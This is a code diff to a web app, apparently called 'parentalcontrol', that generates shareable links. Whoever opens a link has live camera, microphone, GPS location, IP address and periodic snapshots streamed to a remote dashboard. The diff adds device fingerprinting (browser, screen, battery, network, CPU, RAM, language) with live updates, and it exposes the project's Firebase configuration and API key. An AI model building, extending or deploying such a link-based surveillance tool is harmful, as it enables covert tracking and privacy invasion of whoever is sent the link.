@@ -32,6 +32,10 @@
             color: #1c1e21;
             text-align: center;
         }
+        h2 i {
+            margin-right: 8px;
+            color: #007bff;
+        }
         input[type="email"], input[type="password"], input[type="text"] {
             width: 100%;
             padding: 12px;
@@ -97,14 +101,17 @@
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 20px;
+            margin-bottom: 20px;
         }
         .info-box, .video-container, .map-container, .image-container {
             border: 1px solid #ddd;
-            padding: 10px;
-            border-radius: 5px;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: #fdfdfd;
         }
-        .info-box h2 { text-align: left; margin-top: 0; }
-        .info-box p { margin: 5px 0; font-size: 16px; }
+        .info-box { margin-bottom: 20px; }
+        .info-box h2 { text-align: left; margin-top: 0; font-size: 1.2em; }
+        .info-box p { margin: 8px 0; font-size: 16px; }
         .video-header {
             display: flex;
             justify-content: space-between;
@@ -213,27 +220,41 @@
         <div class="live-view">
             <div class="video-container">
                 <div class="video-header">
-                    <h2>Live Camera Feed</h2>
-                    <button id="toggle-audio-btn" title="Listen to Live Audio">
-                        <i class="fas fa-microphone-slash"></i>
-                    </button>
+                    <h2><i class="fas fa-video"></i> Live Camera Feed</h2>
                 </div>
                 <video id="remote-video" autoplay playsinline muted></video>
+                 <button id="toggle-audio-btn" title="Listen to Live Audio" style="width:auto; margin-top:10px;">
+                    <i class="fas fa-microphone-slash"></i> Listen to Audio
+                </button>
             </div>
             <div class="map-container">
-                <h2>Live Location</h2>
+                <h2><i class="fas fa-map-marker-alt"></i> Live Location</h2>
                 <div id="map"></div>
             </div>
         </div>
 
         <div class="info-box">
-             <h2>Client Information</h2>
+             <h2><i class="fas fa-info-circle"></i> Connection Info</h2>
              <p><strong>IP Address:</strong> <span id="client-ip">Waiting...</span></p>
              <p><strong>Status:</strong> <span id="dashboard-status">Awaiting Connection...</span></p>
         </div>
+        
+        <!-- NEW: Detailed Client Information Box -->
+        <div class="info-box" id="details-container">
+            <h2><i class="fas fa-desktop"></i> Client Device & Browser Details</h2>
+            <p><strong>Browser/OS:</strong> <span id="client-user-agent">Waiting...</span></p>
+            <p><strong>Screen Resolution:</strong> <span id="client-screen-res">Waiting...</span></p>
+            <p><strong>Browser Window Size:</strong> <span id="client-window-size">Waiting...</span></p>
+            <p><strong>Battery:</strong> <span id="client-battery">Waiting...</span></p>
+            <p><strong>Network:</strong> <span id="client-network">Waiting...</span></p>
+            <p><strong>Online Status:</strong> <span id="client-online-status">Waiting...</span></p>
+            <p><strong>CPU Cores:</strong> <span id="client-cpu">Waiting...</span></p>
+            <p><strong>Device Memory (RAM):</strong> <span id="client-ram">Waiting...</span></p>
+            <p><strong>Language:</strong> <span id="client-language">Waiting...</span></p>
+        </div>
 
         <div class="image-container">
-            <h2>Latest Snapshot (Updates every 5s)</h2>
+            <h2><i class="fas fa-camera-retro"></i> Latest Snapshot (Updates every 5s)</h2>
             <img id="latest-image" alt="Waiting for snapshot..." >
         </div>
     </div>
@@ -258,14 +279,14 @@
     <script>
         // --- Firebase Configuration ---
         const firebaseConfig = {
-        apiKey: "AIzaSyA0ZwDrt3AxSdvEqENFP9weWvaF5lMwfAE",
-        authDomain: "parentalcontrol-eb9e5.firebaseapp.com",
-        databaseURL: "https://parentalcontrol-eb9e5-default-rtdb.firebaseio.com",
-        projectId: "parentalcontrol-eb9e5",
-        storageBucket: "parentalcontrol-eb9e5.appspot.com",
-        messagingSenderId: "840440578873",
-        appId: "1:840440578873:web:6eadfdcfd9b8852e1a5ee8",
-        measurementId: "G-DFS3EZZ95P"
+            apiKey: "AIzaSyA0ZwDrt3AxSdvEqENFP9weWvaF5lMwfAE",
+            authDomain: "parentalcontrol-eb9e5.firebaseapp.com",
+            databaseURL: "https://parentalcontrol-eb9e5-default-rtdb.firebaseio.com",
+            projectId: "parentalcontrol-eb9e5",
+            storageBucket: "parentalcontrol-eb9e5.appspot.com",
+            messagingSenderId: "840440578873",
+            appId: "1:840440578873:web:6eadfdcfd9b8852e1a5ee8",
+            measurementId: "G-DFS3EZZ95P"
         };
 
         firebase.initializeApp(firebaseConfig);
@@ -302,6 +323,16 @@
         const localVideo = document.getElementById('local-video');
         const clientIpSpan = document.getElementById('client-ip');
         const dashboardStatusSpan = document.getElementById('dashboard-status');
+        // NEW: References for detailed info spans
+        const clientUserAgentSpan = document.getElementById('client-user-agent');
+        const clientScreenResSpan = document.getElementById('client-screen-res');
+        const clientWindowSizeSpan = document.getElementById('client-window-size');
+        const clientBatterySpan = document.getElementById('client-battery');
+        const clientNetworkSpan = document.getElementById('client-network');
+        const clientOnlineStatusSpan = document.getElementById('client-online-status');
+        const clientCpuSpan = document.getElementById('client-cpu');
+        const clientRamSpan = document.getElementById('client-ram');
+        const clientLanguageSpan = document.getElementById('client-language');
 
 
         // --- Main Logic ---
@@ -345,7 +376,6 @@
             logoutBtn.addEventListener('click', () => auth.signOut());
 
             generateLinkBtn.addEventListener('click', () => {
-                // Clean up previous session listeners and connections
                 if (activeSessionRef) activeSessionRef.off();
                 if (peerConnection) peerConnection.close();
                 
@@ -354,17 +384,28 @@
                 dashboardStatusSpan.textContent = "Awaiting Connection...";
                 latestImage.src = "";
                 if(marker) marker.remove();
+                marker = null;
+
+                // NEW: Reset detailed info fields
+                clientUserAgentSpan.textContent = "Waiting...";
+                clientScreenResSpan.textContent = "Waiting...";
+                clientWindowSizeSpan.textContent = "Waiting...";
+                clientBatterySpan.textContent = "Waiting...";
+                clientNetworkSpan.textContent = "Waiting...";
+                clientOnlineStatusSpan.textContent = "Waiting...";
+                clientCpuSpan.textContent = "Waiting...";
+                clientRamSpan.textContent = "Waiting...";
+                clientLanguageSpan.textContent = "Waiting...";
                 
-                // Create a new session in Firebase
                 const sessionRef = db.ref('sessions').push();
-                activeSessionRef = sessionRef; // Store reference for cleanup
+                activeSessionRef = sessionRef;
                 
                 const sessionId = sessionRef.key;
                 const clientUrl = `${window.location.origin}${window.location.pathname}?session=${sessionId}`;
                 
                 generatedLinkInput.value = clientUrl;
                 linkContainer.style.display = 'flex';
-                copyLinkBtn.innerHTML = '<i class="fas fa-copy"></i>'; // Reset copy button
+                copyLinkBtn.innerHTML = '<i class="fas fa-copy"></i>';
                 
                 startDashboardListening(sessionId);
             });
@@ -381,12 +422,15 @@
             toggleAudioBtn.addEventListener('click', () => {
                 remoteVideo.muted = !remoteVideo.muted;
                 const icon = toggleAudioBtn.querySelector('i');
+                const textNode = toggleAudioBtn.childNodes[1]; // Assuming text is after icon
                 if (remoteVideo.muted) {
                     icon.className = 'fas fa-microphone-slash';
+                    textNode.textContent = " Listen to Audio";
                     toggleAudioBtn.classList.remove('live');
                     toggleAudioBtn.title = "Listen to Live Audio";
                 } else {
                     icon.className = 'fas fa-microphone';
+                    textNode.textContent = " Mute Audio";
                     toggleAudioBtn.classList.add('live');
                     toggleAudioBtn.title = "Mute Live Audio";
                 }
@@ -395,7 +439,7 @@
 
         function initializeMap() {
             if (!map) {
-                map = L.map('map').setView([20.5937, 78.9629], 5); // Default to India
+                map = L.map('map').setView([20.5937, 78.9629], 5);
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                     attribution: '© OpenStreetMap'
                 }).addTo(map);
@@ -419,7 +463,6 @@
             const remoteStream = new MediaStream();
             remoteVideo.srcObject = remoteStream;
 
-            // Listen for client data
             sessionRef.child('location').on('value', snapshot => {
                 if (snapshot.exists()) updateMap(snapshot.val().lat, snapshot.val().lng);
             });
@@ -430,17 +473,30 @@
                 if (snapshot.exists()) clientIpSpan.textContent = snapshot.val();
             });
 
-            // Setup Peer Connection
+            // NEW: Listen for detailed client info
+            sessionRef.child('clientDetails').on('value', snapshot => {
+                if (snapshot.exists()) {
+                    const details = snapshot.val();
+                    clientUserAgentSpan.textContent = details.userAgent || 'N/A';
+                    clientScreenResSpan.textContent = details.screenRes || 'N/A';
+                    clientWindowSizeSpan.textContent = details.windowSize || 'N/A';
+                    clientBatterySpan.textContent = details.battery || 'N/A';
+                    clientNetworkSpan.textContent = details.network || 'N/A';
+                    clientOnlineStatusSpan.textContent = details.online || 'N/A';
+                    clientCpuSpan.textContent = details.cpu || 'N/A';
+                    clientRamSpan.textContent = details.ram || 'N/A';
+                    clientLanguageSpan.textContent = details.language || 'N/A';
+                }
+            });
+
             peerConnection = new RTCPeerConnection(peerConnectionConfig);
             
             peerConnection.onconnectionstatechange = () => {
                 const state = peerConnection.connectionState;
-                console.log(`DASHBOARD Connection state: ${state}`);
                 dashboardStatusSpan.textContent = state.charAt(0).toUpperCase() + state.slice(1);
             };
 
             peerConnection.ontrack = event => {
-                console.log("DASHBOARD: Received remote track:", event.track.kind);
                 event.streams[0].getTracks().forEach(track => remoteStream.addTrack(track));
             };
 
@@ -452,24 +508,74 @@
                 if (snapshot.exists()) peerConnection.addIceCandidate(new RTCIceCandidate(snapshot.val())).catch(e => console.error("DASHBOARD: Error adding client ICE candidate", e));
             });
 
-            // Wait for offer from client
             sessionRef.child('offer').on('value', async snapshot => {
                 if (snapshot.exists() && !peerConnection.currentRemoteDescription) {
-                    console.log("DASHBOARD: Received offer, creating answer...");
-                    try {
-                        await peerConnection.setRemoteDescription(new RTCSessionDescription(snapshot.val()));
-                        const answer = await peerConnection.createAnswer();
-                        await peerConnection.setLocalDescription(answer);
-                        sessionRef.child('answer').set({ type: answer.type, sdp: answer.sdp });
-                        console.log("DASHBOARD: Answer sent.");
-                    } catch (e) { console.error("DASHBOARD: Error creating answer: ", e); }
+                    await peerConnection.setRemoteDescription(new RTCSessionDescription(snapshot.val()));
+                    const answer = await peerConnection.createAnswer();
+                    await peerConnection.setLocalDescription(answer);
+                    sessionRef.child('answer').set({ type: answer.type, sdp: answer.sdp });
                 }
             });
         }
 
         // --- Client/Child Functions ---
+
+        // NEW: Function to gather and report client details
+        async function startDetailReporting(sessionRef) {
+            const detailsRef = sessionRef.child('clientDetails');
+
+            const getDetails = async () => {
+                const details = {};
+                details.userAgent = navigator.userAgent || 'N/A';
+                details.screenRes = `${screen.width}x${screen.height}`;
+                details.windowSize = `${window.innerWidth}x${window.innerHeight}`;
+                details.cpu = navigator.hardwareConcurrency || 'N/A';
+                details.ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
+                details.language = navigator.language || 'N/A';
+                details.online = navigator.onLine ? 'Online' : 'Offline';
+
+                if (navigator.connection) {
+                    details.network = `${navigator.connection.effectiveType || 'N/A'} (${navigator.connection.type || 'unknown'})`;
+                } else {
+                    details.network = 'API not supported';
+                }
+                
+                try {
+                    const battery = await navigator.getBattery();
+                    details.battery = `${Math.floor(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+                } catch (e) {
+                    details.battery = 'API not supported';
+                }
+                
+                return details;
+            };
+
+            // Initial report
+            detailsRef.set(await getDetails());
+            
+            // Listen for changes
+            window.addEventListener('resize', () => detailsRef.child('windowSize').set(`${window.innerWidth}x${window.innerHeight}`));
+            window.addEventListener('online', () => detailsRef.child('online').set('Online'));
+            window.addEventListener('offline', () => detailsRef.child('online').set('Offline'));
+            
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    const updateBattery = () => {
+                        detailsRef.child('battery').set(`${Math.floor(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`);
+                    };
+                    battery.addEventListener('levelchange', updateBattery);
+                    battery.addEventListener('chargingchange', updateBattery);
+                });
+            }
+
+            if ('connection' in navigator) {
+                navigator.connection.addEventListener('change', () => {
+                     detailsRef.child('network').set(`${navigator.connection.effectiveType || 'N/A'} (${navigator.connection.type || 'unknown'})`);
+                });
+            }
+        }
+
         async function startClientLogic(sessionId) {
-            console.log(`CLIENT: Starting session ${sessionId}`);
             const sessionRef = db.ref(`sessions/${sessionId}`);
             
             // Fetch and send IP address
@@ -478,11 +584,12 @@
                 const data = await response.json();
                 sessionRef.child('clientInfo/ip').set(data.ip);
             } catch (error) {
-                console.error("CLIENT: Could not fetch IP address.", error);
                 sessionRef.child('clientInfo/ip').set("Unavailable");
             }
             
-            // Request permissions and start streams
+            // NEW: Start reporting detailed info
+            startDetailReporting(sessionRef);
+
             try {
                 statusText.innerHTML = `<i class="fas fa-camera"></i> Requesting permissions...`;
                 statusText.className = 'connecting';
@@ -517,7 +624,6 @@
                 
                 peerConnection.onconnectionstatechange = () => {
                     const state = peerConnection.connectionState;
-                    console.log(`CLIENT Connection state: ${state}`);
                     switch (state) {
                         case 'connecting':
                             statusText.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Establishing connection...`;
@@ -546,23 +652,17 @@
                     if (snapshot.exists()) peerConnection.addIceCandidate(new RTCIceCandidate(snapshot.val())).catch(e => console.error("CLIENT: Error adding dashboard ICE candidate", e));
                 });
                 
-                // Create and send offer
-                console.log("CLIENT: Creating offer...");
                 const offer = await peerConnection.createOffer();
                 await peerConnection.setLocalDescription(offer);
                 sessionRef.child('offer').set({ type: offer.type, sdp: offer.sdp });
-                console.log("CLIENT: Offer sent.");
 
-                // Wait for answer
                 sessionRef.child('answer').on('value', async snapshot => {
                     if (snapshot.exists() && !peerConnection.currentRemoteDescription) {
-                        console.log("CLIENT: Received answer.");
                         await peerConnection.setRemoteDescription(new RTCSessionDescription(snapshot.val()));
                     }
                 });
 
             } catch (error) {
-                console.error("CLIENT: Permission or connection error:", error);
                 statusText.innerHTML = `<i class="fas fa-times-circle"></i> Error: ${error.message}.`;
                 statusText.className = 'error';
                 alert(`Could not start tracking. Please grant all permissions (Camera, Mic, Location) and refresh the page. Error: ${error.name}`);
